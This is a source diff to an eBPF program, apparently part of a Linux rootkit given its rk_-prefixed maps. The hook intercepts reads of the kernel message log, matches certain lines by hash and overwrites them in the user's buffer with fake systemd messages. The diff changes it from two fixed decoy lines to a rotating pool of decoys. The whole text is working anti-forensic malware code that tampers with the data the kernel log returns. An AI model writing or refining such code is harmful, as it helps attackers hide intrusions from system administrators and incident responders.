@@ -100,24 +100,21 @@ int kmsg(struct pt_regs *ctx)
         }
     }
 
-    if (hash == 0xada8e5f3e94cf1f8)
+    //systemd[1]: Resync Network Time Service.
+
+    if (hash == 0xada8e5f3e94cf1f8 || hash == 0x55c7edee212d1ef4)
     {
-        const char override[] = "systemd[1]: Reached target Sockets.";
-        bpf_probe_write_user(fd_attr->read_buf + o1, override, sizeof(override) - 1);
+        int key = fd_attr->kmsg % 30;
+        struct kmsg_t *kmsg = (struct kmsg_t *)bpf_map_lookup_elem(&rk_kmsg, &key);
+        if (!kmsg) {
+            return 0;
+        }
+        fd_attr->kmsg++;
 
-        fd_attr->read_buf += o1 + sizeof(override) - 1;
-        fd_attr->read_size = retval - (o1 + sizeof(override) - 1);
+        bpf_probe_write_user(fd_attr->read_buf + o1, kmsg->str, sizeof(kmsg->str) - 1);
 
-        bpf_tail_call(ctx, &rk_progs, FILL_WITH_ZERO_PROG);
-    }
-
-    if (hash == 0x55c7edee212d1ef4)
-    {
-        const char override[] = "systemd[1]: Reached target Paths.";
-        bpf_probe_write_user(fd_attr->read_buf + o1, override, sizeof(override) - 1);
-
-        fd_attr->read_buf += o1 + sizeof(override) - 1;
-        fd_attr->read_size = retval - (o1 + sizeof(override) - 1);
+        fd_attr->read_buf += o1 + sizeof(kmsg->str) - 1;
+        fd_attr->read_size = retval - (o1 + sizeof(kmsg->str) - 1);
 
         bpf_tail_call(ctx, &rk_progs, FILL_WITH_ZERO_PROG);
     }
